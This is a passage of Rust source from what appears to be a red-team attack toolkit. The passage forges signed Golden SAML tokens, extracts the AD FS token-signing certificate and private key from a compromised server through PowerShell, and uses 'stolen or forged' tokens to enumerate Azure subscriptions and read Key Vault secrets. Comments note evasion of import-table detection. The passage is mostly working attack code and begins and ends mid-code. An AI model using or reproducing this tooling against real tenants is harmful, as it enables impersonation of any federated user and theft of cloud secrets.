            .map_err(|e| anyhow!("failed to parse AD FS token-signing key: {e:?}"))?;

        let now = now_epoch_secs();
        let now_iso = Self::epoch_to_iso8601(now);
        let not_before = claims.not_before.as_deref().unwrap_or(&now_iso).to_string();
        let default_expiry = Self::epoch_to_iso8601(now + 3600);
        let not_on_or_after = claims
            .not_on_or_after
            .as_deref()
            .unwrap_or(&default_expiry)
            .to_string();

        let assertion_id = format!("_{}", Uuid::new_v4());

        // Build attribute statements
        let attributes_xml = claims
            .attributes
            .iter()
            .map(|(name, value)| {
                format!(
                    r#"        <saml:Attribute Name="{}" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
            <saml:AttributeValue>{}</saml:AttributeValue>
        </saml:Attribute>"#,
                    xml_escape(name),
                    xml_escape(value)
                )
            })
            .collect::<Vec<_>>()
            .join("\n");

        let attributes_block = if attributes_xml.is_empty() {
            String::new()
        } else {
            format!(
                "      <saml:AttributeStatement>\n{}\n      </saml:AttributeStatement>",
                attributes_xml
            )
        };

        // Build the SAML assertion (unsigned portion)
        let assertion = format!(
            r##"<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="{}"
    IssueInstant="{}"
    Version="2.0">
  <saml:Issuer>{}</saml:Issuer>
  <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#" Id="Signature1">
    <ds:SignedInfo>
      <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
      <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
      <ds:Reference URI="#{}">
        <ds:Transforms>
          <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
          <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
        </ds:Transforms>
        <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
        <ds:DigestValue>PLACEHOLDER_DIGEST</ds:DigestValue>
      </ds:Reference>
    </ds:SignedInfo>
    <ds:SignatureValue>PLACEHOLDER_SIGNATURE</ds:SignatureValue>
    <ds:KeyInfo>
      <ds:X509Data>
        <ds:X509Certificate>{}</ds:X509Certificate>
      </ds:X509Data>
    </ds:KeyInfo>
  </ds:Signature>
  <saml:Subject>
    <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">{}</saml:NameID>
    <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <saml:SubjectConfirmationData NotOnOrAfter="{}" Recipient="urn:federation:MicrosoftOnline"/>
    </saml:SubjectConfirmation>
  </saml:Subject>
  <saml:Conditions NotBefore="{}" NotOnOrAfter="{}">
    <saml:AudienceRestriction>
      <saml:Audience>{}</saml:Audience>
    </saml:AudienceRestriction>
  </saml:Conditions>
  <saml:AuthnStatement AuthnInstant="{}" SessionIndex="{}">
    <saml:AuthnContext>
      <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
    </saml:AuthnContext>
  </saml:AuthnStatement>
{}
</saml:Assertion>"##,
            assertion_id,
            now_iso,
            xml_escape(&claims.issuer),
            assertion_id,
            base64::engine::general_purpose::STANDARD.encode(token_signing_cert_der),
            xml_escape(&claims.subject),
            not_on_or_after,
            not_before,
            not_on_or_after,
            xml_escape(&claims.audience),
            now_iso,
            assertion_id,
            attributes_block,
        );

        // Compute the digest of the assertion (excluding the signature value and digest)
        //
        // SAML XML-DSIG workflow (per xml-dsig spec):
        //   1. Strip the <ds:Signature> element from the assertion (enveloped-signature transform)
        //   2. Apply exclusive XML canonicalization (exc-c14n) to the remainder
        //   3. SHA-256 the canonicalized bytes → DigestValue
        //   4. Build <ds:SignedInfo> with the real DigestValue
        //   5. Apply exc-c14n to <ds:SignedInfo>
        //   6. RSA-SHA256 sign the canonicalized SignedInfo bytes → SignatureValue
        //   7. Insert DigestValue and SignatureValue into the assertion
        //
        // The canonical forms must be computed from the **actual** assertion XML,
        // not from a separately-reconstructed string, to avoid canonicalization
        // mismatch (attribute ordering, whitespace, namespace differences).

        // Step 1: Extract the assertion body by stripping the entire <ds:Signature> … </ds:Signature>
        // block from the assertion template (which still contains placeholders).
        let assertion_body_for_digest = strip_signature_element(&assertion);

        // Step 2: Apply exclusive XML canonicalization to the stripped assertion.
        let assertion_canonical = exc_c14n(&assertion_body_for_digest);

        // Step 3: SHA-256 of the canonical assertion body.
        let digest_value = digest(&SHA256, assertion_canonical.as_bytes());
        let digest_b64 = base64::engine::general_purpose::STANDARD.encode(digest_value.as_ref());

        // Step 4: Build the canonical <ds:SignedInfo> element with the real digest.
        // The canonical form uses compact XML (no unnecessary whitespace) with
        // explicit self-closing tags, matching the exc-c14n output.
        let signed_info_canonical = format!(
            r##"<ds:SignedInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"></ds:CanonicalizationMethod><ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"></ds:SignatureMethod><ds:Reference URI="#{}"><ds:Transforms><ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"></ds:Transform><ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"></ds:Transform></ds:Transforms><ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"></ds:DigestMethod><ds:DigestValue>{}</ds:DigestValue></ds:Reference></ds:SignedInfo>"##,
            assertion_id, digest_b64
        );

        // Step 5: RSA-SHA256 sign the canonical SignedInfo.
        let rng = SystemRandom::new();
        let mut signature_bytes = vec![0u8; key_pair.public().modulus_len()];
        key_pair
            .sign(
                &RSA_PKCS1_SHA256,
                &rng,
                signed_info_canonical.as_bytes(),
                &mut signature_bytes,
            )
            .map_err(|e| anyhow!("RSA-SHA256 signing of SAML assertion failed: {e:?}"))?;

        let signature_b64 = base64::engine::general_purpose::STANDARD.encode(&signature_bytes);

        // Step 6: Replace placeholders with real values.
        let result = assertion
            .replace("PLACEHOLDER_DIGEST", &digest_b64)
            .replace("PLACEHOLDER_SIGNATURE", &signature_b64);

        Ok(result)
    }

    /// Extract the AD FS token-signing key from a compromised AD FS server.
    ///
    /// This method reads the AD FS configuration from the Windows Internal
    /// Database (WID) or from the exported AD FS configuration XML file.
    /// The token-signing certificate's private key is stored in the local
    /// machine certificate store.
    ///
    /// **Note**: This requires access to the AD FS server and typically
    /// requires local Administrator on the AD FS server.
    #[cfg(windows)]
    pub fn extract_adfs_token_signing_key() -> Result<(Vec<u8>, Vec<u8>)> {
        // AD FS stores its configuration in:
        //   C:\Windows\ADFS\Microsoft.IdentityServer.ServiceHost.exe.config
        //   or the WID database at:
        //   C:\Windows\WID\Data\adfsartifactstore.mdf
        //
        // The token-signing certificate thumbprint is in the AD FS configuration.
        // The private key is in the LocalMachine\My certificate store.
        //
        // For red team purposes, we read the config file directly.

        // Step 1: Read the AD FS configuration
        let adfs_config_path = r"C:\Windows\ADFS\Microsoft.IdentityServer.ServiceHost.exe.config";
        let config_xml = std::fs::read_to_string(adfs_config_path)
            .context("failed to read AD FS config -- is this an AD FS server?")?;

        // Step 2: Extract token-signing certificate thumbprint from the config
        // The config contains <serviceSettings> with <tokenSigningCertificate> elements
        let thumbprint = Self::find_thumbprint_in_config(&config_xml)?;

        // Step 3: Export the certificate + private key from the certificate store
        // We use the CryptoAPI via runtime-resolved calls to avoid IAT entries
        let (cert_der, key_der) = Self::export_cert_from_store(&thumbprint)?;

        Ok((cert_der, key_der))
    }

    /// Non-Windows fallback for AD FS key extraction.
    #[cfg(not(windows))]
    pub fn extract_adfs_token_signing_key() -> Result<(Vec<u8>, Vec<u8>)> {
        bail!("AD FS token-signing key extraction is only supported on Windows — AD FS is a Windows Server role")
    }

    /// Extract the AD FS token-signing key from raw certificate files.
    ///
    /// If the operator has already obtained the AD FS token-signing certificate
    /// and private key (e.g., via PowerShell `Get-AdfsCertificate` or by
    /// exporting from the certificate store), this function validates and
    /// returns them.
    pub fn load_adfs_key_from_files(
        cert_pem: &str,
        key_pem: &str,
    ) -> Result<(Vec<u8>, Vec<u8>)> {
        let cert_der = pem_to_der_local(cert_pem)?;
        let key_der = pem_to_der_local(key_pem)?;

        // Validate the key can be parsed
        let _ = RsaKeyPair::from_der(&key_der)
            .map_err(|e| anyhow!("AD FS key is not a valid PKCS#8 RSA key: {e:?}"))?;

        Ok((cert_der, key_der))
    }

    /// Find a certificate thumbprint in the AD FS configuration XML.
    #[cfg(windows)]
    fn find_thumbprint_in_config(config_xml: &str) -> Result<String> {
        // Look for <tokenSigningCertificate> or <SigningCertificate> elements
        // AD FS v4+ uses thumbprint attribute
        for line in config_xml.lines() {
            let line_lower = line.to_lowercase();
            if line_lower.contains("tokensigningcertificate") || line_lower.contains("signingcertificate") {
                // Extract thumbprint attribute value
                if let Some(thumbprint) = Self::extract_attribute(line, "thumbprint") {
                    return Ok(thumbprint);
                }
                if let Some(thumbprint) = Self::extract_attribute(line, "Thumbprint") {
                    return Ok(thumbprint);
                }
            }
        }
        bail!("token-signing certificate thumbprint not found in AD FS config")
    }

    /// Extract an XML attribute value by name.
    #[cfg(windows)]
    fn extract_attribute(line: &str, attr_name: &str) -> Option<String> {
        let pattern = format!("{attr_name}=\"");
        if let Some(start) = line.find(&pattern) {
            let value_start = start + pattern.len();
            if let Some(end) = line[value_start..].find('"') {
                let value = line[value_start..value_start + end].to_string();
                // Normalize: remove spaces
                return Some(value.replace(' ', ""));
            }
        }
        None
    }

    /// Export a certificate + private key from the LocalMachine\My store.
    ///
    /// Uses runtime-resolved CryptoAPI calls (no IAT entries).
    #[cfg(windows)]
    fn export_cert_from_store(thumbprint: &str) -> Result<(Vec<u8>, Vec<u8>)> {
        use std::os::raw::c_void;
        use crate::win_types::DWORD;

        // Runtime-resolve CertOpenStore, CertFindCertificateInStore, etc.
        // For now, use a simplified approach: read from the cert store files
        // at C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\

        // Alternative: use PowerShell output as a subprocess
        let cert_output = std::process::Command::new("powershell")
            .args([
                "-NoProfile",
                "-NonInteractive",
                "-Command",
                &format!(
                    "$cert = Get-ChildItem Cert:\\LocalMachine\\My | Where-Object {{$_.Thumbprint -eq '{}' }} | Select-Object -First 1; \
                     if ($cert) {{ \
                       $certBytes = $cert.RawData; \
                       $keyBytes = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::ExportRSAPrivateKey($cert, [System.Security.Cryptography.PbeParameters]::new([System.Security.Cryptography.PbeEncryptionAlgorithm]::Aes256Cbc, [System.Security.Cryptography.HashAlgorithmName]::SHA256, 100000)); \
                       [Convert]::ToBase64String($certBytes) + '|' + [Convert]::ToBase64String($keyBytes) \
                     }}",
                    thumbprint
                ),
            ])
            .output()
            .context("failed to run PowerShell for cert export")?;

        if !cert_output.status.success() {
            let stderr = String::from_utf8_lossy(&cert_output.stderr);
            bail!("PowerShell cert export failed: {}", stderr);
        }

        let output_str = String::from_utf8_lossy(&cert_output.stdout).trim().to_string();
        let parts: Vec<&str> = output_str.split('|').collect();
        if parts.len() != 2 {
            bail!("unexpected PowerShell cert export output format");
        }

        let cert_der = base64::engine::general_purpose::STANDARD
            .decode(parts[0])
            .context("cert DER base64 decode failed")?;
        let key_der = base64::engine::general_purpose::STANDARD
            .decode(parts[1])
            .context("key DER base64 decode failed")?;

        Ok((cert_der, key_der))
    }

    /// Convert a UNIX epoch timestamp to ISO 8601 format.
    fn epoch_to_iso8601(epoch: u64) -> String {
        // Simple ISO 8601 UTC format: YYYY-MM-DDTHH:MM:SSZ
        let secs = epoch as i64;
        let days = secs / 86400;
        let time_secs = secs % 86400;
        let hours = time_secs / 3600;
        let minutes = (time_secs % 3600) / 60;
        let seconds = time_secs % 60;

        // Compute year/month/day from days since epoch
        let (year, month, day) = days_to_ymd(days);
        format!(
            "{:04}-{:02}-{:02}T{:02}:{:02}:{:02}Z",
            year, month, day, hours, minutes, seconds
        )
    }
}

/// Convert days since UNIX epoch to year/month/day.
fn days_to_ymd(mut days: i64) -> (i64, i64, i64) {
    // Shift to days since 0000-03-01 (makes leap year math easier)
    let mut year = (400 * days + 59) / 146097;
    let mut day_of_year = days - (365 * year + year / 4 - year / 100 + year / 400);

    if day_of_year < 0 {
        year -= 1;
        day_of_year = days - (365 * year + year / 4 - year / 100 + year / 400);
    }

    let month_offset = (52 * (day_of_year + 1)) / 1531;
    let day = day_of_year - (153 * month_offset + 2) / 5 + 1;
    let month = if month_offset < 10 { month_offset + 3 } else { month_offset - 9 };

    (year, month, day)
}

/// Escape special XML characters.
fn xml_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&apos;")
}

/// Strip the first `<ds:Signature …>…</ds:Signature>` element from an XML string.
///
/// This implements the enveloped-signature transform (xml-dsig §6.5.4):
/// the `ds:Signature` element (and everything inside it) is removed so that
/// the digest is computed over the rest of the document.
fn strip_signature_element(xml: &str) -> String {
    // Find the opening <ds:Signature tag.
    let open_tag = match xml.find("<ds:Signature") {
        Some(pos) => pos,
        None => return xml.to_string(),
    };
    // From there, find the matching closing </ds:Signature>.
    let close_tag = match xml.find("</ds:Signature>") {
        Some(pos) => pos,
        None => return xml.to_string(),
    };
    let end = close_tag + "</ds:Signature>".len();
    // Splice out the Signature block, trimming the whitespace that surrounded it.
    let mut out = String::with_capacity(xml.len());
    out.push_str(xml[..open_tag].trim_end());
    out.push_str(xml[end..].trim_start());
    out
}

/// Minimal exclusive XML canonicalization (exc-c14n) for SAML assertions.
///
/// This is **not** a full exc-c14n implementation — it handles the subset of
/// XML produced by `forge_saml_token`.  Specifically:
///
/// - Removes XML declarations (`<?xml …?>`).
/// - Removes comments (`<!-- … -->`).
/// - Removes processing instructions.
/// - Normalises attribute value escaping (the template already escapes values
///   through `xml_escape`, so we just preserve them).
/// - Converts self-closing elements (`<foo/>` or `<foo />`) to `<foo></foo>`
///   — **not** required by exc-c14n but kept for consistency with the template.
/// - Strips *insignificant* whitespace between elements (all whitespace
///   between `>` and `<` is collapsed away), while preserving whitespace
///   inside text content of leaf elements.
/// - Does **not** sort attributes (the template already produces them in a
///   deterministic order) and does **not** handle namespace inheritance
///   (the template already inlines all namespace declarations).
///
/// This is sufficient for correctly signing the SAML assertions we generate.
fn exc_c14n(xml: &str) -> String {
    let mut out = String::with_capacity(xml.len());
    let mut chars = xml.char_indices().peekable();
    let len = xml.len();

    while let Some((i, ch)) = chars.next() {
        match ch {
            '<' => {
                // Skip XML declaration.
                if xml[i..].starts_with("<?xml") {
                    if let Some(end) = xml[i..].find("?>") {
                        let skip = end + 2;
                        for _ in 0..skip {
                            chars.next();
                        }
                        continue;
                    }
                }
                // Skip comments.
                if xml[i..].starts_with("<!--") {
                    if let Some(end) = xml[i..].find("-->") {
                        let skip = end + 3;
                        for _ in 0..skip {
                            chars.next();
                        }
                        continue;
                    }
                }
                // Skip processing instructions (other than <?xml …?>).
                if xml[i..].starts_with("<?") {
                    if let Some(end) = xml[i..].find("?>") {
                        let skip = end + 2;
                        for _ in 0..skip {
                            chars.next();
                        }
                        continue;
                    }
                }
                out.push('<');
            }
            '>' => {
                out.push('>');
                // Remove insignificant whitespace after '>' until the next '<'.
                // But preserve text content (non-whitespace between > and <).
                let text_start = i + 1;
                let mut j = text_start;
                while j < len && xml.as_bytes()[j] != b'<' {
                    j += 1;
                }
                if j > text_start {
                    let between = &xml[text_start..j];
                    // If there's any non-whitespace, it's text content — preserve it.
                    if !between.trim().is_empty() {
                        out.push_str(between);
                    }
                }
                // Advance chars iterator past the consumed whitespace/text.
                while chars.peek().map_or(false, |(idx, _)| *idx < j) {
                    chars.next();
                }
            }
            _ => {
                // Normalise \r\n → \n, standalone \r → \n (c14n requirement).
                if ch == '\r' {
                    out.push('\n');
                    // If next is \n, skip it (we already emitted one \n).
                    if chars.peek().map_or(false, |(_, c)| *c == '\n') {
                        chars.next();
                    }
                } else {
                    out.push(ch);
                }
            }
        }
    }

    out
}

// ---------------------------------------------------------------------------
// Token utilization
// ---------------------------------------------------------------------------

/// Token utilization helper.
///
/// Provides convenience methods for querying Microsoft Graph, Azure Resource
/// Manager, and Key Vault APIs using stolen or forged access tokens.
pub struct TokenUtil {
    http_client: reqwest::Client,
    cloud: CloudEnvironment,
}

impl TokenUtil {
    /// Create a new TokenUtil instance.
    pub fn new(cloud: CloudEnvironment) -> Result<Self> {
        let http_client = reqwest::Client::builder()
            .danger_accept_invalid_certs(true)
            .timeout(Duration::from_secs(30))
            .build()
            .context("failed to build HTTP client for TokenUtil")?;
        Ok(Self { http_client, cloud })
    }

    /// Execute a Microsoft Graph API query using an access token.
    ///
    /// `path` is relative to the Graph API root, e.g., `/v1.0/users`.
    /// Optional OData query parameters can be provided.
    pub async fn query_graph_with_token<T: serde::de::DeserializeOwned>(
        &self,
        access_token: &str,
        path: &str,
        query_params: Option<&[(&str, &str)]>,
    ) -> Result<T> {
        let url = format!("{}{path}", graph_url_for(&self.cloud));

        let mut req = self
            .http_client
            .get(&url)
            .header("Authorization", format!("Bearer {access_token}"))
            .header("Content-Type", "application/json");

        if let Some(params) = query_params {
            req = req.query(params);
        }

        let resp = req.send().await.context("Graph API query HTTP error")?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("Graph API query failed: HTTP {} — {}", status, body);
        }

        resp.json().await.context("failed to parse Graph API response")
    }

    /// List Azure resources (subscriptions) accessible with the token.
    ///
    /// Uses the Azure Resource Manager API to enumerate subscriptions.
    pub async fn list_azure_resources(
        &self,
        access_token: &str,
    ) -> Result<AzureSubscriptionList> {
        let url = format!("{}/subscriptions?api-version=2020-01-01", arm_url_for(&self.cloud));

        let resp = self
            .http_client
            .get(&url)
            .header("Authorization", format!("Bearer {access_token}"))
            .header("Content-Type", "application/json")
            .send()
            .await
            .context("ARM subscriptions list HTTP error")?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("ARM subscriptions list failed: HTTP {} — {}", status, body);
        }

        resp.json()
            .await
            .context("failed to parse ARM subscriptions response")
    }

    /// List resources within a subscription.
    pub async fn list_subscription_resources(
        &self,
        access_token: &str,
        subscription_id: &str,
    ) -> Result<AzureResourceList> {
        let url = format!(
            "{}/subscriptions/{}/resources?api-version=2021-04-01",
            arm_url_for(&self.cloud),
            subscription_id
        );

        let resp = self
            .http_client
            .get(&url)
            .header("Authorization", format!("Bearer {access_token}"))
            .header("Content-Type", "application/json")
            .send()
            .await
            .context("ARM resources list HTTP error")?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("ARM resources list failed: HTTP {} — {}", status, body);
        }

        resp.json()
            .await
            .context("failed to parse ARM resources response")
    }

    /// List secrets in an Azure Key Vault.
    ///
    /// `access_token` must have the `https://vault.azure.net/.default` scope.
    pub async fn list_key_vault_secrets(
        &self,
        access_token: &str,
        vault_name: &str,
    ) -> Result<KeyVaultSecretList> {
        let url = format!(
            "{}/secrets?api-version=7.4",
            vault_url_for(vault_name, &self.cloud)
        );

        let resp = self
            .http_client
            .get(&url)
            .header("Authorization", format!("Bearer {access_token}"))
            .header("Content-Type", "application/json")
            .send()
            .await
            .context("Key Vault secrets list HTTP error")?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("Key Vault secrets list failed: HTTP {} — {}", status, body);
        }

        resp.json()
            .await
            .context("failed to parse Key Vault secrets response")
    }

    /// Get a specific secret's value from Key Vault.
    pub async fn get_key_vault_secret(
        &self,
        access_token: &str,
        vault_name: &str,
        secret_name: &str,
    ) -> Result<KeyVaultSecret> {
        let url = format!(
            "{}/secrets/{}?api-version=7.4",
            vault_url_for(vault_name, &self.cloud),
            secret_name
        );

        let resp = self
            .http_client
            .get(&url)
            .header("Authorization", format!("Bearer {access_token}"))
            .header("Content-Type", "application/json")
            .send()
            .await
            .context("Key Vault secret get HTTP error")?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("Key Vault secret get failed: HTTP {} — {}", status, body);
        }

        resp.json()
            .await
            .context("failed to parse Key Vault secret response")
    }

    /// List storage accounts in a subscription.
    pub async fn list_storage_accounts(
        &self,
        access_token: &str,
        subscription_id: &str,
    ) -> Result<AzureResourceList> {
        let url = format!(
            "{}/subscriptions/{}/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01",
            arm_url_for(&self.cloud),
            subscription_id
        );

        let resp = self
            .http_client
            .get(&url)
            .header("Authorization", format!("Bearer {access_token}"))
            .header("Content-Type", "application/json")
            .send()
            .await
            .context("storage accounts list HTTP error")?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("storage accounts list failed: HTTP {} — {}", status, body);
        }

        resp.json()
            .await
            .context("failed to parse storage accounts response")
    }

    /// Get the current user's profile from Graph API.
    pub async fn get_current_user(
        &self,
        access_token: &str,
    ) -> Result<GraphMeResponse> {
        self.query_graph_with_token(access_token, "/v1.0/me", None)
            .await
    }
}

// ---------------------------------------------------------------------------
// Azure ARM / Key Vault response types
// ---------------------------------------------------------------------------

/// Azure subscription list response.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AzureSubscriptionList {
    #[serde(default)]
    pub value: Vec<AzureSubscription>,
    #[serde(rename = "nextLink", default)]
    pub next_link: Option<String>,
}

/// Azure subscription.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AzureSubscription {
    #[serde(default)]
    pub id: Option<String>,
    #[serde(rename = "subscriptionId", default)]
    pub subscription_id: Option<String>,
    #[serde(rename = "displayName", default)]
    pub display_name: Option<String>,
    #[serde(default)]
    pub state: Option<String>,
}

/// Azure resource list response.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AzureResourceList {
    #[serde(default)]
    pub value: Vec<AzureResource>,
    #[serde(rename = "nextLink", default)]
    pub next_link: Option<String>,
}

/// Azure resource.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AzureResource {
    #[serde(default)]
    pub id: Option<String>,
    #[serde(default)]
    pub name: Option<String>,
    #[serde(default)]
    #[serde(rename = "type")]
    pub resource_type: Option<String>,
    #[serde(default)]
    pub location: Option<String>,
    #[serde(default)]
    pub tags: HashMap<String, String>,
}

/// Key Vault secret list response.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KeyVaultSecretList {
    #[serde(default)]
    pub value: Vec<KeyVaultSecretItem>,
    #[serde(rename = "nextLink", default)]
    pub next_link: Option<String>,
}

/// Key Vault secret item (metadata only, no value).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KeyVaultSecretItem {
    #[serde(default)]
    pub id: Option<String>,
    #[serde(rename = "attributes", default)]
    pub secret_attributes: Option<KeyVaultSecretAttributes>,
    #[serde(default)]
    pub tags: HashMap<String, String>,
    #[serde(default)]
    pub content_type: Option<String>,
    #[serde(default)]
    pub managed: Option<bool>,
}

/// Key Vault secret attributes.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KeyVaultSecretAttributes {
    #[serde(default)]
    pub enabled: Option<bool>,
    #[serde(default)]
    pub created: Option<u64>,
    #[serde(default)]
    pub updated: Option<u64>,
    #[serde(rename = "exp", default)]
    pub expires: Option<u64>,
    #[serde(rename = "nbf", default)]
    pub not_before: Option<u64>,
    #[serde(default)]
    pub recoverable_days: Option<u32>,
}

/// Key Vault secret (with value).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KeyVaultSecret {
    #[serde(default)]
    pub id: Option<String>,
    #[serde(default)]
    pub value: Option<String>,
    #[serde(default)]
    pub kid: Option<String>,
    #[serde(default)]
    pub content_type: Option<String>,
    #[serde(default)]
    pub tags: HashMap<String, String>,
    #[serde(rename = "attributes", default)]
    pub secret_attributes: Option<KeyVaultSecretAttributes>,
}

/// Graph API /me response.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct GraphMeResponse {
    #[serde(default)]
    pub id: Option<String>,
    #[serde(default)]
    pub display_name: Option<String>,
    #[serde(default)]
    pub user_principal_name: Option<String>,
    #[serde(default)]
    pub mail: Option<String>,
    #[serde(default)]
    pub job_title: Option<String>,
    #[serde(default)]
    pub office_location: Option<String>,
    #[serde(default)]
    pub mobile_phone: Option<String>,
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_decode_jwt_claims_valid() {
        // Create a minimal JWT: header.payload.signature
        let header = URL_SAFE_NO_PAD.encode(r#"{"alg":"RS256","typ":"JWT"}"#);
        let payload = URL_SAFE_NO_PAD.encode(r#"{"sub":"test-user","upn":"test@contoso.com","tid":"tenant-123"}"#);
        let jwt = format!("{header}.{payload}.fake-signature");

        let claims = decode_jwt_claims(&jwt).unwrap();
        assert_eq!(claims["sub"].as_str(), Some("test-user"));
        assert_eq!(claims["upn"].as_str(), Some("test@contoso.com"));
        assert_eq!(claims["tid"].as_str(), Some("tenant-123"));
    }

    #[test]
    fn test_decode_jwt_claims_invalid_segments() {
        let result = decode_jwt_claims("not.a.valid.jwt.with.too.many.dots");
        assert!(result.is_err());
    }

    #[test]
    fn test_decode_jwt_claims_invalid_base64() {
        let result = decode_jwt_claims("header.!!!.signature");
        assert!(result.is_err());
    }

    #[test]
    fn test_parse_prt_jwt_extracts_fields() {
        let claims_json = r#"{"sub":"obj-123","upn":"admin@contoso.com","tid":"tenant-456","isu":"aad"}"#;
        let payload_b64 = URL_SAFE_NO_PAD.encode(claims_json);
        let header_b64 = URL_SAFE_NO_PAD.encode(r#"{"alg":"RS256"}"#);
        let jwt = format!("{header_b64}.{payload_b64}.sig");

        let prt = parse_prt_jwt(&jwt, Some("session-key-base64".to_string()), PrtSource::BrowserCookie).unwrap();
        assert_eq!(prt.upn.as_deref(), Some("admin@contoso.com"));
        assert_eq!(prt.tenant_id.as_deref(), Some("tenant-456"));
        assert_eq!(prt.object_id.as_deref(), Some("obj-123"));
        assert_eq!(prt.source, PrtSource::BrowserCookie);
        assert_eq!(prt.session_key.as_deref(), Some("session-key-base64"));
    }

    #[test]
    fn test_xml_escape() {
        assert_eq!(xml_escape("hello"), "hello");
        assert_eq!(xml_escape("a<b>c&d\"e\"f'g"), "a&lt;b&gt;c&amp;d&quot;e&quot;f&apos;g");
    }

    #[test]
    fn test_epoch_to_iso8601() {
        // 2024-01-01T00:00:00Z = 1704067200
        let iso = GoldenSaml::epoch_to_iso8601(1704067200);
        assert!(iso.starts_with("2024-01-01"));
        assert!(iso.ends_with('Z'));
    }

    #[test]
    fn test_days_to_ymd() {
        // 1970-01-01 = day 0
        let (y, m, d) = days_to_ymd(0);
        assert_eq!(y, 1970);
        assert_eq!(m, 1);
        assert_eq!(d, 1);

        // 2024-01-01 = 19723 days since epoch
        let (y, m, d) = days_to_ymd(19723);
        assert_eq!(y, 2024);
        assert_eq!(m, 1);
        assert_eq!(d, 1);
    }

    #[test]
    fn test_access_token_expiry() {
        let token = AccessToken {
            access_token: "test".to_string(),
            token_type: "Bearer".to_string(),
            expires_in: 3600,
            scope: "test".to_string(),
            obtained_at: now_epoch_secs(),
        };
        // Should not be expired yet
        assert!(!token.is_expired(60));
    }

    #[test]
    fn test_cloud_endpoints_commercial() {
        let te = token_endpoint_for(&CloudEnvironment::Commercial, "test-tenant");
        assert!(te.contains("login.microsoftonline.com"));
        assert!(te.contains("test-tenant"));
        assert_eq!(graph_url_for(&CloudEnvironment::Commercial), "https://graph.microsoft.com");
        assert_eq!(arm_url_for(&CloudEnvironment::Commercial), "https://management.azure.com");
        assert_eq!(
            vault_url_for("myvault", &CloudEnvironment::Commercial),
            "https://myvault.vault.azure.net"
        );
    }

    #[test]
    fn test_cloud_endpoints_government() {
        let te = token_endpoint_for(&CloudEnvironment::Government, "test-tenant");
        assert!(te.contains("login.microsoftonline.us"));
        assert_eq!(graph_url_for(&CloudEnvironment::Government), "https://graph.microsoft.us");
        assert_eq!(arm_url_for(&CloudEnvironment::Government), "https://management.usgovcloudapi.net");
        assert_eq!(
            vault_url_for("myvault", &CloudEnvironment::Government),
            "https://myvault.vault.usgovcloudapi.net"
        );
    }

    #[test]
    fn test_saml_claims_default() {
        let claims = SamlClaims::default();
        assert_eq!(claims.audience, "urn:federation:MicrosoftOnline");
        assert!(claims.attributes.is_empty());
    }

    #[test]
    fn test_pem_to_der_local() {
        let raw = b"test data 1234";
        let b64 = base64::engine::general_purpose::STANDARD.encode(raw);
        let pem = format!("-----BEGIN TEST-----\n{b64}\n-----END TEST-----");
        let der = pem_to_der_local(&pem).unwrap();
        assert_eq!(der, raw);
    }

    #[test]
    fn test_cert_thumbprint() {
        let cert_der = b"fake cert for thumbprint test";
        let t1 = cert_thumbprint(cert_der);
        let t2 = cert_thumbprint(cert_der);
        assert_eq!(t1, t2);
        let decoded = URL_SAFE_NO_PAD.decode(&t1).unwrap();
        assert_eq!(decoded.len(), 20, "SHA-1 thumbprint is 20 bytes");
    }

    #[test]
    fn test_find_prt_in_json() {
        let theft = PrtTheft::new(CloudEnvironment::Commercial).unwrap();

        // Create a fake JWT payload
        let header_b64 = URL_SAFE_NO_PAD.encode(r#"{"alg":"RS256"}"#);
        let claims_b64 = URL_SAFE_NO_PAD.encode(r#"{"sub":"test"}"#);
        let fake_jwt = format!("{header_b64}.{claims_b64}.fake-sig");

        let json = serde_json::json!({
            "tokens": [
